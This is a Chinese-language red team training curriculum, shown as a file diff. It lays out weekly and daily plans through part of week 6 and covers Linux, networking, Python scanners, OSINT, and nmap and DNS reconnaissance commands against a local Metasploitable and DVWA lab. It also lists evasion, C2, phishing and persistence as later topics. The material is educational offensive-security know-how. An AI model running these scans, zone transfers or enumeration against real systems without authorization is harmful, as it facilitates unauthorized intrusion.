@@ -1,0 +1,3491 @@
+================================================================================
+           红队队员成长训练计划 (Red Team Operator Training Plan)
+                  总周期: 24周 (6个月) | 每日: 3小时
+================================================================================
+
+编制说明:
+  本训练计划面向零基础学员, 目标是经过24周系统训练后, 具备独立完成渗透测试任务
+  的红队作战能力。计划采用模块化设计, 分为四个阶段, 每周5个训练日+1个复习日+1个
+  休息日。每日3小时分为理论学习、动手实践、复盘总结三个模块。
+
+  训练原则:
+    1. 循序渐进 — 从基础到进阶, 不可跳跃
+    2. 理论结合实践 — 每个知识点必须有动手环节
+    3. 持续复盘 — 每日整理笔记, 每周回顾总结
+    4. 身心健康 — 体能训练和饮食计划同等重要
+
+================================================================================
+一、训练阶段划分 (Training Phases)
+================================================================================
+
+────────────────────────────────────────────────────────────────
+第一阶段: 基础打造期 (第1-4周) — Foundation Building
+────────────────────────────────────────────────────────────────
+  目标: 打下坚实的技术基础, 建立安全思维框架
+
+  核心内容:
+    - Linux基础与命令行操作
+    - 网络原理 (TCP/IP, OSI模型, 子网划分)
+    - 编程基础 (Bash脚本, Python入门)
+    - 安全基础概念 (漏洞分类, 攻击链模型, 渗透测试流程)
+    - 虚拟化环境搭建 (VirtualBox, 基于Arch Linux的攻击机 + ArchStrike)
+
+  阶段性考核 (第4周末):
+    [ ] 能在Linux终端中熟练操作 (文件管理、权限、进程、网络命令)
+    [ ] 理解TCP/IP协议栈, 能解释三次握手和四次挥手
+    [ ] 能用Python写出端口扫描器和简单HTTP请求脚本
+    [ ] 能独立搭建Arch Linux + ArchStrike + Metasploitable实验环境
+    [ ] 理解渗透测试标准流程 (PTES)
+
+────────────────────────────────────────────────────────────────
+第二阶段: 技能积累期 (第5-12周) — Skill Accumulation
+────────────────────────────────────────────────────────────────
+  目标: 掌握核心渗透测试技能, 能完成基础渗透任务
+
+  核心内容:
+    - 信息收集与侦察技术 (被动/主动情报收集)
+    - 网络扫描与漏洞评估 (Nmap, Nessus, OpenVAS)
+    - Web安全基础 (SQL注入, XSS, CSRF, 文件上传, 命令注入)
+    - 漏洞利用基础 (Metasploit, SearchSploit, 漏洞原理)
+    - 密码攻击 (Hydra, John, Hashcat, 密码喷射)
+    - 无线安全基础 (Aircrack-ng, WPA2攻击原理)
+
+  阶段性考核 (第12周末):
+    [ ] 能对目标进行完整信息收集并输出侦察报告
+    [ ] 能使用多种工具进行漏洞扫描和验证
+    [ ] 能独立完成DVWA上所有难度的Web漏洞利用
+    [ ] 能用Metasploit完成基本的漏洞利用和权限提升
+    [ ] 完成至少5台VulnHub或HTB靶机
+
+────────────────────────────────────────────────────────────────
+第三阶段: 进阶提升期 (第13-20周) — Advanced Techniques
+────────────────────────────────────────────────────────────────
+  目标: 具备红队作战能力, 掌握内网和域渗透
+
+  核心内容:
+    - 内网渗透与域渗透 (AD域基础, Kerberos攻击, 委派攻击)
+    - 免杀与防御绕过 (杀软对抗, AMSI绕过, 代码混淆)
+    - 后渗透与横向移动 (凭证窃取, PTH/PTT, PSExec, WMI)
+    - C2框架与红队基础设施 (Cobalt Strike, Sliver, 域名隐匿)
+    - 社会工程学 (钓鱼邮件, 恶意宏, 钓鱼网站)
+    - 权限维持 (持久化技术, 后门植入, 计划任务)
+
+  阶段性考核 (第20周末):
+    [ ] 能搭建简单的AD域环境并完成域渗透链
+    [ ] 理解杀软检测原理并能实现基本的免杀处理
+    [ ] 能使用C2框架管理多个会话并执行横向移动
+    [ ] 能设计并执行简单的钓鱼攻击
+    [ ] 完成至少3台HTB中等级别(Medium)靶机
+
+────────────────────────────────────────────────────────────────
+第四阶段: 实战综合期 (第21-24周) — Real-world Simulation
+────────────────────────────────────────────────────────────────
+  目标: 可独立完成渗透任务, 具备红队专业素养
+
+  核心内容:
+    - 综合实战演练 (完整渗透链练习)
+    - 红蓝对抗模拟 (假设企业环境演练)
+    - 渗透测试报告写作
+    - 工具开发与自动化 (Python/Go开发安全工具)
+    - 职业发展规划 (认证路径: OSCP/OSEP/CRTO)
+
+  最终考核 (第24周末):
+    [ ] 完成至少2次完整的外网打点到内网域控的渗透模拟
+    [ ] 独立撰写一份专业渗透测试报告
+    [ ] 至少完成1款自研安全工具的编写
+    [ ] 制定个人后续学习和认证考试计划
+
+================================================================================
+二、每周日程表 (Weekly Schedule Template)
+================================================================================
+
+┌──────────┬─────────────────────────────────────────────────────┐
+│  时间段   │                      活动内容                        │
+├──────────┼─────────────────────────────────────────────────────┤
+│ 06:30    │ 起床, 洗漱, 喝一杯温水                                │
+│ 07:00    │ 早餐 (详见饮食计划)                                    │
+│ 07:30    │ 体能训练 (30分钟, 详见身体训练计划)                      │
+│ 08:00    │ 自由时间 / 准备工作                                    │
+├──────────┼─────────────────────────────────────────────────────┤
+│ 训练时间 (根据个人情况选择上午或晚上, 以下以晚上为例)                 │
+├──────────┼─────────────────────────────────────────────────────┤
+│ 19:00    │ 第1小时: 理论学习和阅读                                 │
+│          │   - 前30分钟: 阅读教材/观看视频/学习理论知识              │
+│          │   - 后30分钟: 做笔记, 画思维导图, 总结要点               │
+│ 20:00    │ 第2小时: 动手实践                                      │
+│          │   - 在实验环境中实际操作                                 │
+│          │   - 完成当天的实践任务                                   │
+│          │   - 截图记录操作过程和结果                                │
+│ 21:00    │ 第3小时: 复盘总结和笔记整理                              │
+│          │   - 回顾今天的操作, 记录遇到的问题                        │
+│          │   - 整理笔记到个人知识库 (Markdown/Obsidian/Notion)     │
+│          │   - 记录未解决的问题, 标记后续学习                        │
+│ 22:00    │ 自由时间, 放松                                          │
+│ 22:30    │ 停止使用电子设备, 准备入睡                               │
+│ 23:00    │ 入睡                                                   │
+└──────────┴─────────────────────────────────────────────────────┘
+
+  周六 — Review Day (复习日):
+    - 09:00-11:00: 回顾本周学习的所有内容
+    - 11:00-12:00: 整理本周笔记, 统一归档
+    - 14:00-16:00: 对本周未掌握的内容进行加强练习
+    - 16:00-17:00: 在进度表上打勾, 撰写本周学习总结
+
+  周日 — Rest Day (休息日):
+    - 完全休息, 不碰技术
+    - 可进行户外活动, 运动, 社交
+    - 保证充足睡眠
+
+================================================================================
+三、每日训练模块 (Detailed Daily Training Plans)
+================================================================================
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+第一阶段: 基础打造期 (第1-4周) 具体计划
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+────────────────────────────────────────────────────────────────
+【第1周: Linux基础与环境搭建】
+────────────────────────────────────────────────────────────────
+
+周一: Linux概述与目录结构
+  第1小时: 理论
+    - 阅读: Linux发展历史, 发行版对比 (Arch Linux vs Debian/Ubuntu vs RHEL)
+    - 学习: Linux文件系统层次结构标准 (FHS)
+    - 重点: /bin, /etc, /home, /var, /tmp, /root 等目录的作用
+    - 写笔记总结Linux目录结构图
+  第2小时: 实践
+    - 在Arch Linux终端中使用 tree / 命令查看目录结构 (先安装: sudo pacman -S tree)
+    - 使用 ls -la 查看隐藏文件和权限
+    - 使用 cd, pwd 在不同目录间导航
+    - 使用 man 命令查看手册页
+    - 练习: 不看屏幕, 在脑海中构建Linux目录树
+  第3小时: 复盘
+    - 创建Markdown笔记: Linux文件系统结构
+    - 画出Linux根目录结构图
+    - 记录今日遇到的命令和疑问
+
+周二: 文件操作命令
+  第1小时: 理论
+    - 学习: touch, mkdir, cp, mv, rm, ln 命令用法
+    - 理解: 硬链接 vs 软链接的区别
+    - 学习: 文件通配符 (*, ?, [])
+    - 阅读: Linux文件权限基础概念
+  第2小时: 实践
+    - 在~/practice目录下创建多级目录结构
+    - 练习文件的创建、复制、移动和删除
+    - 创建软链接和硬链接, 对比差异
+    - 使用通配符批量操作文件
+    - 练习: cat, less, more, head, tail 查看文件内容
+  第3小时: 复盘
+    - 整理文件操作命令速查表
+    - 记录软/硬链接的区别要点
+    - 总结通配符使用场景
+
+周三: 文件权限与用户管理
+  第1小时: 理论
+    - 学习: rwx权限模型, 数字权限表示 (chmod 755)
+    - 学习: chown, chgrp 更改所有者
+    - 学习: su, sudo 区别和使用
+    - 理解: /etc/passwd, /etc/shadow, /etc/group
+  第2小时: 实践
+    - 创建测试用户和组
+    - 设置不同文件权限, 验证读写执行权限效果
+    - 配置sudoers文件, 给用户授予特定sudo权限
+    - 练习: 查找系统中SUID文件 (find / -perm -4000)
+    - 理解为什么SUID对安全很重要
+  第3小时: 复盘
+    - 整理权限管理速查表
+    - 画图说明Linux权限模型
+    - 记录SUID/SGID安全风险
+
+周四: 文本处理与管道
+  第1小时: 理论
+    - 学习: grep, sed, awk 三大文本处理工具
+    - 理解: 标准输入/输出/错误 (stdin, stdout, stderr)
+    - 学习: 管道 (|) 和重定向 (>, >>, <, 2>)
+    - 学习: sort, uniq, wc, cut, tr 命令
+  第2小时: 实践
+    - 使用grep在/var/log中搜索特定模式
+    - 使用sed进行文本替换操作
+    - 使用awk提取和格式化输出
+    - 组合使用管道: cat file | grep xxx | sort | uniq -c | sort -rn
+    - 分析Apache/Nginx日志文件
+  第3小时: 复盘
+    - 整理grep常用正则表达式
+    - 总结awk常用命令模式
+    - 记录今日管道组合技巧
+
+周五: 进程管理与网络基础命令
+  第1小时: 理论
+    - 学习: ps, top, htop, kill, bg, fg 进程管理
+    - 学习: systemctl 服务管理
+    - 学习: ifconfig/ip, netstat/ss, ping, traceroute
+    - 学习: cron定时任务配置
+  第2小时: 实践
+    - 使用ps aux查看所有进程, 理解各字段含义
+    - 后台运行程序, 使用jobs管理
+    - 使用netstat/ss查看网络连接状态
+    - 使用curl/wget下载文件
+    - 设置一个cron定时任务
+  第3小时: 复盘
+    - 整理进程管理命令速查表
+    - 画图说明进程状态转换 (运行/睡眠/停止/僵尸)
+    - 总结网络诊断命令使用场景
+
+周六 (复习日):
+  - 回顾本周所有Linux命令, 制作完整命令速查表
+  - 在终端中不看笔记, 完成以下挑战:
+    1. 创建一个目录结构, 设置不同权限
+    2. 找到系统中所有SUID文件并列出
+    3. 用一行管道命令统计日志中访问最多的10个IP
+    4. 创建一个定时任务, 每分钟向/tmp/test.log追加时间戳
+  - 整理本周笔记到知识库
+
+────────────────────────────────────────────────────────────────
+【第2周: 网络原理基础】
+────────────────────────────────────────────────────────────────
+
+周一: OSI模型与TCP/IP协议栈
+  第1小时: 理论
+    - 学习: OSI七层模型 (物理层->数据链路层->网络层->传输层->会话层->表示层->应用层)
+    - 学习: TCP/IP四层模型对比
+    - 理解: 每一层的功能、协议和数据单元
+    - 重点: 封装与解封装过程
+  第2小时: 实践
+    - 使用Wireshark抓包, 观察各层封装
+    - 分析一个HTTP请求从应用层到物理层的完整封装
+    - 查看以太网帧结构、IP包头、TCP包头
+    - 使用 tcpdump 在终端抓包
+  第3小时: 复盘
+    - 画出OSI模型图, 标注每层的协议
+    - 用实际抓包截图说明封装过程
+    - 总结常用协议所在层级
+
+周二: IP地址与子网划分
+  第1小时: 理论
+    - 学习: IPv4地址分类 (A/B/C/D/E类)
+    - 学习: 私有地址 vs 公有地址
+    - 学习: 子网掩码与CIDR表示法
+    - 学习: 子网划分计算方法 (2^n - 2)
+    - 学习: IPv6基础概念
+  第2小时: 实践
+    - 手动计算: 192.168.1.0/24 划分8个子网
+    - 手动计算: 10.0.0.0/16 划分64个子网
+    - 使用 ipcalc 或在线工具验证计算
+    - 配置静态IP和DHCP
+    - 理解广播地址和网络地址
+  第3小时: 复盘
+    - 整理子网划分计算口诀
+    - 做10道子网划分练习题
+    - 记录CIDR常用掩码表
+
+周三: TCP协议深入
+  第1小时: 理论
+    - 学习: TCP三次握手 (SYN, SYN-ACK, ACK)
+    - 学习: TCP四次挥手 (FIN, ACK, FIN, ACK)
+    - 学习: TCP标志位 (SYN, ACK, FIN, RST, PSH, URG)
+    - 学习: TCP窗口大小与流量控制
+    - 理解: TCP状态转换图
+  第2小时: 实践
+    - 用Wireshark抓取一次完整的TCP连接
+    - 分析三次握手过程, 确认序列号和确认号
+    - 分析四次挥手过程
+    - 使用 nc (netcat) 建立TCP连接
+    - 使用 scapy 发送自定义TCP包
+  第3小时: 复盘
+    - 画出TCP三次握手和四次挥手时序图
+    - 理解为什么是三次握手而不是两次或四次
+    - 总结TCP可靠传输机制
+
+周四: UDP协议与常见应用层协议
+  第1小时: 理论
+    - 学习: UDP协议特点 (无连接, 不可靠, 低延迟)
+    - 学习: TCP vs UDP 对比和使用场景
+    - 学习: DNS协议基础 (查询类型, 递归/迭代查询)
+    - 学习: HTTP协议基础 (请求方法, 状态码, 报文结构)
+    - 学习: DHCP协议工作原理 (DORA过程)
+  第2小时: 实践
+    - 使用 dig/nslookup 进行DNS查询
+    - 使用Python requests库发送HTTP请求
+    - 使用 nc -u 测试UDP通信
+    - 用Wireshark分析一次完整的DNS查询
+    - 分析一次完整的HTTP请求-响应
+  第3小时: 复盘
+    - 整理常见应用层协议端口号
+    - 总结HTTP状态码分类 (1xx-5xx)
+    - 画出DNS解析过程图
+
+周五: 网络实战 — 搭建实验环境
+  第1小时: 理论
+    - 学习: 虚拟化技术基础 (Hypervisor类型)
+    - 学习: NAT vs 桥接 vs Host-Only 网络模式
+    - 理解: 实验网络拓扑设计
+    - 学习: ArchStrike工具库概览 (pacman -Sl archstrike)
+  第2小时: 实践
+    - 确认本机Arch Linux + ArchStrike环境已就绪
+    - 安装ArchStrike核心工具组: sudo pacman -Syy && sudo pacman -S archstrike-base archstrike-web
+    - 安装VirtualBox并下载Metasploitable 2 (练习靶机)
+    - 配置Host-Only网络, 使攻击机与靶机互通
+    - 验证网络连通性 (ping, nmap简单扫描)
+    - 安装并配置DVWA (Damn Vulnerable Web Application)
+  第3小时: 复盘
+    - 画出实验环境拓扑图
+    - 整理虚拟机网络配置要点
+    - 列出已安装的安全工具清单
+
+周六 (复习日):
+  - 画出完整的TCP/IP协议栈图
+  - 在Wireshark中分析一个完整网络请求的各层封装
+  - 完成以下网络实操:
+    1. 用scapy构造并发送SYN包
+    2. 用Python socket编写TCP客户端和服务器
+    3. 用Wireshark分析DNS和HTTP交互
+    4. 验证实验环境中所有虚拟机互通
+
+────────────────────────────────────────────────────────────────
+【第3周: 编程基础 — Bash与Python】
+────────────────────────────────────────────────────────────────
+
+周一: Bash脚本基础
+  第1小时: 理论
+    - 学习: Bash变量定义和使用 ($变量名, ${变量名})
+    - 学习: 条件判断 (if/elif/else, test/[[]])
+    - 学习: 循环 (for, while, until)
+    - 学习: 函数定义和调用
+    - 学习: 命令行参数 ($1, $#, $@, $?)
+  第2小时: 实践
+    - 编写脚本: 批量创建用户
+    - 编写脚本: 检查服务状态并重启
+    - 编写脚本: 备份指定目录到/tmp
+    - 编写脚本: 解析命令行参数
+    - 调试脚本: 使用 bash -x 和 set -e
+  第3小时: 复盘
+    - 整理Bash常用语法速查表
+    - 总结脚本调试技巧
+    - 将有用的脚本加入工具箱
+
+周二: Python基础 (一)
+  第1小时: 理论
+    - 学习: Python数据类型 (int, str, list, dict, tuple, set)
+    - 学习: 控制流 (if/elif/else, for, while)
+    - 学习: 函数定义, 参数和返回值
+    - 学习: 文件读写操作
+    - 学习: 异常处理 (try/except/finally)
+  第2小时: 实践
+    - 编写: 猜数字游戏
+    - 编写: 文件内容统计工具 (行数、词数、字符数)
+    - 编写: IP地址合法性验证程序
+    - 编写: 从文本文件中提取邮箱地址的正则脚本
+    - 练习: Python交互式调试 (pdb/ipdb)
+  第3小时: 复盘
+    - 整理Python基础语法备忘
+    - 总结常见错误和调试方法
+    - 记录Python2与Python3的关键差异
+
+周三: Python基础 (二) — 网络编程
+  第1小时: 理论
+    - 学习: socket模块基础
+    - 学习: TCP客户端/服务器编程模型
+    - 学习: 多线程基础 (threading模块)
+    - 学习: subprocess模块执行系统命令
+    - 学习: argparse命令行参数解析
+  第2小时: 实践
+    - 编写: 一个简单的TCP端口扫描器
+    - 编写: TCP代理(proxy)程序 — 接收数据并转发
+    - 编写: 使用subprocess调用nmap并解析输出
+    - 编写: 多线程批量ping扫描器
+    - 测试编写的扫描器在实验环境中使用
+  第3小时: 复盘
+    - 整理socket编程API参考
+    - 总结端口扫描器编写思路
+    - 记录多线程编程常见问题
+
+周四: Python基础 (三) — HTTP与数据处理
+  第1小时: 理论
+    - 学习: requests库发送HTTP请求
+    - 学习: BeautifulSoup/正则解析HTML
+    - 学习: JSON/XML数据处理
+    - 学习: 爬虫基础概念与Robots协议
+    - 注意: 合法合规使用爬虫技术
+  第2小时: 实践
+    - 编写: 网页标题提取器
+    - 编写: 批量URL状态码检测工具
+    - 编写: 简单的目录扫描脚本
+    - 编写: 从HTTP响应头提取服务器信息的脚本
+    - 编写: 一个简单的内容发现脚本
+  第3小时: 复盘
+    - 整理HTTP相关Python代码模板
+    - 总结requests库常见用法
+    - 记录网页解析的几种方法对比
+
+周五: 综合编程练习
+  第1小时: 理论
+    - 复习本周Bash和Python知识点
+    - 学习: 代码规范和注释规范
+    - 学习: Git基础 (init, add, commit, branch, log)
+    - 了解: 如何使用GitHub管理自己的代码
+  第2小时: 实践
+    - 初始化Git仓库, 提交本周所有练习代码
+    - 编写一个综合脚本: 自动化信息收集工具
+      (包含: ping扫描, 端口扫描, WHOIS查询, DNS枚举)
+    - 给脚本添加命令行参数和帮助信息
+    - 测试完整功能并记录结果
+  第3小时: 复盘
+    - 整理本周所有代码, 分类归档
+    - 在GitHub上创建仓库并推送
+    - 记录编程中遇到的问题和解决方案
+    - 给自己定一个代码练习小目标
+
+周六 (复习日):
+  - 完成以下编程挑战:
+    1. 用Bash写一个日志分析脚本
+    2. 用Python写一个TCP端口扫描器 (支持多线程和自定义端口范围)
+    3. 用Python写一个HTTP爆破目录脚本
+    4. 将所有脚本推送到GitHub
+  - 整理编程速查表
+
+────────────────────────────────────────────────────────────────
+【第4周: 安全基础概念与渗透测试流程】
+────────────────────────────────────────────────────────────────
+
+周一: 安全基础概念
+  第1小时: 理论
+    - 学习: 信息安全三要素 (机密性C, 完整性I, 可用性A)
+    - 学习: 常见攻击分类 (主动攻击 vs 被动攻击)
+    - 学习: 漏洞概念 (CVE, CVSS评分, 0day, Nday)
+    - 学习: 安全术语 (POC, EXP, Payload, Shellcode, 提权)
+    - 了解: 红队 vs 蓝队 vs 紫队
+  第2小时: 实践
+    - 浏览CVE Details网站, 了解近期高危漏洞
+    - 在Exploit-DB上浏览近期公开的Exploit
+    - 在CVE官网搜索一个具体漏洞, 阅读详情
+    - 了解CVSS 3.1评分计算器
+    - 阅读一份真实的安全公告/漏洞报告
+  第3小时: 复盘
+    - 建立安全术语词汇表 (持续更新)
+    - 整理CVE编号规则和查询方法
+    - 总结红队工作的核心目标
+
+周二: 渗透测试方法论
+  第1小时: 理论
+    - 学习: PTES (渗透测试执行标准) 7个阶段
+      1. 前期交互 (Pre-engagement)
+      2. 情报收集 (Intelligence Gathering)
+      3. 威胁建模 (Threat Modeling)
+      4. 漏洞分析 (Vulnerability Analysis)
+      5. 漏洞利用 (Exploitation)
+      6. 后渗透 (Post Exploitation)
+      7. 报告 (Reporting)
+    - 学习: Cyber Kill Chain (网络杀伤链)
+    - 学习: MITRE ATT&CK框架概述
+  第2小时: 实践
+    - 画出PTES流程图
+    - 在MITRE ATT&CK网站浏览攻击矩阵
+    - 选择一个APT组织, 查看其使用的TTP
+    - 理解ATT&CK的战术(Tactics)和技术(Techniques)
+    - 找出ATT&CK中与初始访问相关的技术
+  第3小时: 复盘
+    - 整理PTES各阶段的输入输出
+    - 画出Kill Chain 7个阶段
+    - 理解ATT&CK在企业安全中的应用
+
+周三: ArchStrike工具库概览
+  第1小时: 理论
+    - 学习: ArchStrike工具组分类 (pacman -Sg | grep archstrike)
+      - archstrike-base (基础工具)
+      - archstrike-recon (信息侦察)
+      - archstrike-scanner (网络扫描)
+      - archstrike-web (Web应用分析)
+      - archstrike-exploit (漏洞利用)
+      - archstrike-cracking (密码攻击)
+      - archstrike-wireless (无线攻击)
+      - archstrike-forensics (数字取证)
+      - archstrike-sniffer (嗅探/欺骗)
+      - archstrike-privilege-escalation (权限提升)
+      - archstrike-proxy (代理隧道)
+    - 查看所有可用包: pacman -Sl archstrike
+  第2小时: 实践
+    - 安装推荐工具组:
+      sudo pacman -S archstrike-base archstrike-web archstrike-cracking
+    - 试用以下核心工具 (archstrike已预装):
+      - nmap (网络扫描)
+      - wireshark (流量分析)
+      - burpsuite (Web代理, 社区版)
+      - msfconsole (Metasploit漏洞利用框架)
+      - john (密码破解)
+      - hydra (在线密码暴力破解)
+      - sqlmap (SQL注入自动化)
+      - nikto (Web扫描器)
+    - 运行 sudo pacman -Syu 更新系统和所有工具
+    - 查看ArchStrike wiki: firefox https://archstrike.org/wiki
+  第3小时: 复盘
+    - 整理ArchStrike核心工具清单和用途
+    - 为每个工具写一句话描述
+    - 标记需要深入学习的主力工具
+
+周四: 实验环境完整搭建
+  第1小时: 理论
+    - 学习: Docker基础概念 (镜像, 容器, Dockerfile)
+    - 学习: 靶场类型 (Web靶场, 系统靶场, AD域靶场)
+    - 了解: VulnHub, HackTheBox, TryHackMe平台
+    - 学习: 实验环境安全隔离注意事项
+  第2小时: 实践
+    - 使用Docker快速搭建以下靶场:
+      - docker pull vulnerables/web-dvwa (DVWA)
+      - docker pull bkimminich/juice-shop (OWASP Juice Shop)
+      - docker pull acgpiano/sqli-labs (SQLi-Labs)
+    - 安装并启动Metasploitable 2
+    - 验证所有靶场在Host-Only网络中可访问
+    - 配置攻击机(ArchStrike)与所有靶场的网络连接
+    - 制作实验环境快照 (快照是救命稻草!)
+  第3小时: 复盘
+    - 画出完整的实验环境拓扑图
+    - 列出所有靶机的IP和端口
+    - 记录Docker常用命令
+    - 确保至少有一个可回滚的实验环境快照
+
+周五: 第一阶段复盘与考核
+  第1小时: 理论
+    - 回顾第1-4周所有学习内容
+    - 检查基础概念的掌握情况
+    - 整理知识体系框架
+  第2小时: 实践 (第一阶段考核)
+    完成以下考核任务:
+    1. Linux操作考核:
+       - 在终端中查找所有大于10M的文件
+       - 统计access.log中返回200状态码的行数
+       - 创建一个用户并配置其sudo权限
+    2. 网络考核:
+       - 用Python socket编写TCP客户端连接到靶机80端口
+       - 用Wireshark分析HTTP报文结构
+       - 手动计算子网划分: 172.16.0.0/16划分16个子网
+    3. 编程考核:
+       - 用Bash编写脚本, 自动备份/var/log到/tmp/backup
+       - 用Python编写多线程端口扫描器
+    4. 环境考核:
+       - 展示攻击机(ArchStrike)与靶机间的网络连通性
+       - 展示至少3个已运行的Docker靶场
+  第3小时: 复盘
+    - 记录考核中暴露的薄弱环节
+    - 制定第一阶段薄弱点补强计划
+    - 在第一阶段进度表上打勾
+
+周六 (复习日):
+  - 制作第一阶段知识体系思维导图
+  - 对薄弱点进行针对性补强
+  - 整理第一阶段学习笔记总索引
+  - 输出第一阶段学习总结 (至少500字)
+
+────────────────────────────────────────────────────────────────
+【第一阶段小结】
+────────────────────────────────────────────────────────────────
+  完成第1-4周后, 你应该具备以下能力:
+    ☐ 熟练使用Linux命令行进行日常操作
+    ☐ 理解TCP/IP协议栈和常见网络协议
+    ☐ 能用Python编写基本的安全工具
+    ☐ 理解渗透测试标准流程和攻击框架
+    ☐ 搭建并维护个人实验环境
+
+  在第一阶段进度表上确认所有项目已打勾后, 进入第二阶段。
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+第二阶段: 技能积累期 (第5-12周) 具体计划
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+────────────────────────────────────────────────────────────────
+【第5周: 信息收集与侦察技术 (一) — 被动信息收集】
+────────────────────────────────────────────────────────────────
+
+周一: OSINT基础与搜索引擎利用
+  第1小时: 理论
+    - 学习: OSINT (开源情报) 概念和工作流程
+    - 学习: Google Hacking / Google Dorking
+      - site:, inurl:, intitle:, filetype:, intext:, cache:
+    - 学习: 搜索引擎高级搜索语法
+    - 了解: 其他搜索引擎 (Shodan, Censys, ZoomEye)
+    - 注意: 信息收集的合法边界
+  第2小时: 实践
+    - 使用Google Dorking查找暴露的目录列表
+    - 使用Shodan搜索特定地区的开放服务
+    - 使用Censys搜索特定域的SSL证书
+    - 编写一个Google Dorking语法速查表
+    - 练习使用Github Dorking搜索泄露信息
+  第3小时: 复盘
+    - 整理Google Dorking语法大全
+    - 记录Shodan常用搜索语法
+    - 总结OSINT信息收集流程
+
+周二: WHOIS与DNS信息收集
+  第1小时: 理论
+    - 学习: WHOIS查询原理和数据结构
+    - 学习: DNS记录类型 (A, AAAA, CNAME, MX, NS, TXT, SOA, PTR)
+    - 学习: DNS区域传送漏洞原理
+    - 学习: 子域名枚举原理 (字典爆破, 证书透明, 搜索引擎)
+  第2小时: 实践
+    - 使用 whois 命令查询域名注册信息
+    - 使用 dig 查询各种DNS记录:
+      dig A example.com
+      dig MX example.com
+      dig NS example.com
+      dig TXT example.com
+      dig ANY example.com
+    - 尝试DNS区域传送: dig AXFR example.com @ns-server
+    - 使用 Dmitry 进行综合信息收集
+    - 使用 theHarvester 收集邮箱和主机信息
+  第3小时: 复盘
+    - 整理DNS记录类型速查表
+    - 总结WHOIS信息要点
+    - 记录信息收集的输出格式
+
+周三: 子域名枚举与资产发现
+  第1小时: 理论
+    - 学习: 子域名枚举方法论
+    - 学习: 证书透明 (Certificate Transparency) 原理
+    - 了解: 自动化资产发现工具链
+    - 学习: 被动子域名收集 vs 主动子域名收集
+    - 理解: CDN和WAF对信息收集的干扰
+  第2小时: 实践
+    - 使用 Sublist3r 进行子域名枚举
+    - 使用 Amass 进行被动和主动子域名收集:
+      amass enum -passive -d example.com
+      amass enum -active -d example.com
+    - 使用 crt.sh 查询证书透明日志
+    - 使用 Assetfinder 发现关联域名
+    - 整理并去重收集到的子域名列表
+  第3小时: 复盘
+    - 建立子域名枚举工具链
+    - 整理常用子域名字典 (来自SecLists)
+    - 总结CDN识别的几种方法
+
+周四: 邮箱与人员信息收集
+  第1小时: 理论
+    - 学习: 邮箱格式常见规律
+    - 学习: 社交媒体信息收集 (LinkedIn, Twitter)
+    - 学习: PGP密钥搜索
+    - 了解: 数据泄露查询 (Have I Been Pwned API)
+    - 注意: 社会工程学的法律和道德边界
+  第2小时: 实践
+    - 使用 theHarvester 收集邮箱地址:
+      theHarvester -d example.com -b google,linkedin
+    - 使用 hunter.io 查找企业邮箱格式
+    - 使用 LinkedIn 搜索目标公司员工
+    - 编写Python脚本验证邮箱格式有效性
+    - 了解 breached password 查询方法
+  第3小时: 复盘
+    - 整理信息收集报告模板
+    - 记录信息收集的法律边界
+    - 总结被动信息收集的10种方法
+
+周五: 综合信息收集实战
+  第1小时: 理论
+    - 复习本周所有信息收集方法
+    - 学习: 信息收集结果整理和归档方法
+    - 了解: 如何编写侦察报告
+  第2小时: 实践
+    对Metasploitable 2进行完整被动信息收集:
+    - DNS信息 (如果适用)
+    - 端口和服务信息 (通过Shodan等公开来源)
+    - 搜索该靶机相关的漏洞信息
+    - 了解Metasploitable 2的默认配置
+    - 将收集的信息整理成结构化文档
+  第3小时: 复盘
+    - 输出第一份侦察报告 (Markdown格式)
+    - 建立信息收集检查清单 (Checklist)
+    - 记录本周使用的工具和效果评价
+
+周六 (复习日):
+  - 对本周练习的靶机以外的真实域名进行信息收集 (注意: 仅限公开信息)
+  - 整理信息收集方法论
+  - 完善信息收集工具链
+  - 更新侦察报告模板
+
+────────────────────────────────────────────────────────────────
+【第6周: 网络扫描与漏洞评估】
+────────────────────────────────────────────────────────────────
+
+周一: Nmap深入 (一) — 主机发现与端口扫描
+  第1小时: 理论
+    - 学习: Nmap主机发现技术 (-sn, -PE, -PP, -PM, -PA, -PS, -PU, -PR)
+    - 学习: Nmap端口扫描技术 (-sS, -sT, -sA, -sW, -sM, -sN, -sF, -sX)
+    - 理解: TCP SYN扫描 vs TCP Connect扫描
+    - 理解: 防火墙/IDS对扫描的反应
+    - 学习: Nmap端口状态 (open, closed, filtered, unfiltered)
+  第2小时: 实践
+    - 对Metasploitable 2进行各种扫描:
+      nmap -sn 192.168.56.0/24       (主机发现)
+      nmap -sS 192.168.56.101         (SYN扫描)
+      nmap -sT 192.168.56.101         (Connect扫描)
+      nmap -sU 192.168.56.101         (UDP扫描)
+      nmap -p 1-1000 192.168.56.101   (指定端口范围)
+      nmap -p- 192.168.56.101         (全端口扫描65535)
+    - 使用Wireshark观察不同扫描的流量差异
+    - 对比扫描时间: -T0 到 -T5
+  第3小时: 复盘
+    - 制作Nmap端口扫描技术对照表
+    - 总结不同扫描类型的应用场景
+    - 记录扫描速度与隐蔽性的权衡
+
+周二: Nmap深入 (二) — 服务版本与OS检测
+  第1小时: 理论
+    - 学习: 服务版本检测原理 (-sV)
+    - 学习: OS指纹检测原理 (-O)
+    - 学习: Nmap脚本引擎 (NSE) 架构
+    - 学习: NSE脚本分类 (auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln)
+    - 了解: Nmap输出格式 (-oN, -oX, -oG, -oA)
+  第2小时: 实践
+    - 对靶机进行完整扫描:
+      nmap -sV -sC -O -A 192.168.56.101
+    - 使用vuln分类脚本进行漏洞检测:
+      nmap --script vuln 192.168.56.101
+    - 使用特定NSE脚本:
+      nmap --script http-enum 192.168.56.101
+      nmap --script smb-enum-shares 192.168.56.101
+      nmap --script ftp-anon 192.168.56.101
+    - 生成各种格式的报告并对比
+    - 学习NSE脚本存放路径: /usr/share/nmap/scripts/
+  第3小时: 复盘
+    - 整理Nmap常用命令组合
+    - 总结NSE最常用的20个脚本
+    - 制作Nmap参数速查表
+
+周三: 漏洞扫描器使用
+  第1小时: 理论
